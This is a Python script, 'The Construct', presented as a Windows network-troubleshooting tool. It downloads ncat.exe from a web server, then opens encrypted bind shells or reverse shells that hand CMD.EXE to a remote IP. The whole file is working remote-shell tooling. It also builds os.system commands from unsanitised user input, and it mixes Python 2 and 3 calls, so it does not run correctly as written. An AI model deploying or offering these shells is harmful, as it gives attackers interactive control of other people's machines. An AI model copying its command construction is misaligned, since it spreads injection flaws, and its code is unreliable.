import os
import urllib

# The Construct encrypted remote command shell tool by bitfu
# https://keybase.io/bitfu
# https://twitter.com/bitfu_
# https://github.com/bitfu

# Tool to quickly construct encrypted TCP remote command shells for network troubleshooting in Windows environments.

# Requirements:
# 1) To run - either: a) Python installed on each host, b) create a portable Windows executable file from TheContruct.py, or c) something else that works for you :)
# 2) Ncat.exe located on an accessible web server - see: https://nmap.org/ncat
# 3) Replace the web server address with your preferred URL for Ncat.exe download - in line: 'urllib.urlretrieve("https://0.0.0.0/ncat.exe", filename="c:/temp/ncat.exe")'

os.system("cls")
print (" ")
print ("  The Construct encrypted remote command shell tool by bitfu")
print ("================================================================")
print (" ")
print ("  The Construct")
while True:
    print (" ")
    WInput = input('  [1] Connect to Bind Shell\n  [2] Host Bind Shell\n  [3] Send Reverse Shell\n  [4] Receive Reverse Shell\n  [5] Download Ncat to Local Host\n  [6] I Need an EXIT!\n  :')
    print (" ")
    if WInput == 1:
        print ("\n[*] Connect to Bind Shell")
        print (" ")
        WN10 = raw_input('[+] Enter Target IP: ')
        print (" ")
        WN11 = raw_input('[+] Enter Target TCP Port: ')
        print (" ")
        os.system ("start c:/temp/ncat.exe --ssl -nv "+WN10+' '+WN11)
        print ("[!] Connecting to bind shell on: "+WN10+':'+WN11)
        print (" ")

    elif WInput == 2:
        print ("\n[*] Host Bind Shell")
        print (" ")
        WNL10 = raw_input('[+] Enter Listener TCP Port: ')
        print (" ")
        os.system("start c:/temp/ncat.exe --ssl -lv -e CMD.EXE -p "+WNL10)
        print ("[!] Hosted bind shell on TCP port: "+WNL10)
        print (" ")

    elif WInput == 3:
        print ("\n[*] Send Reverse Shell")
        print (" ")
        WNB10 = raw_input('[+] Enter Receiver IP: ')
        print (" ")
        WNB11 = raw_input('[+] Enter Receiver TCP Port: ')
        print (" ")
        os.system("start c:/temp/ncat.exe --ssl -nve CMD.EXE "+WNB10+' '+WNB11)
        print ("[!] Sending reverse shell to: "+WNB10+':'+WNB11)
        print (" ")

    elif WInput == 4:
        print ("\n[*] Receive Reverse Shell")
        print (" ")
        WNX10 = raw_input('[+] Enter Listener TCP Port: ')
        print (" ")
        os.system("start c:/temp/ncat.exe --ssl -lvp "+WNX10)
        print ("[!] Listening for reverse shell on TCP port: "+WNX10)
        print (" ")        
            
    elif WInput == 5:
        print ("\n[*] Download Ncat to Local Host")
        urllib.urlretrieve("https://0.0.0.0/ncat.exe", filename="c:/temp/ncat.exe")
        print (" ")
        print ("[!] Ncat.exe downloaded to local host")
        print (" ")
                                   
    elif WInput == 6:
        print ("\n[!] EXITING The Construct...")
        break
          
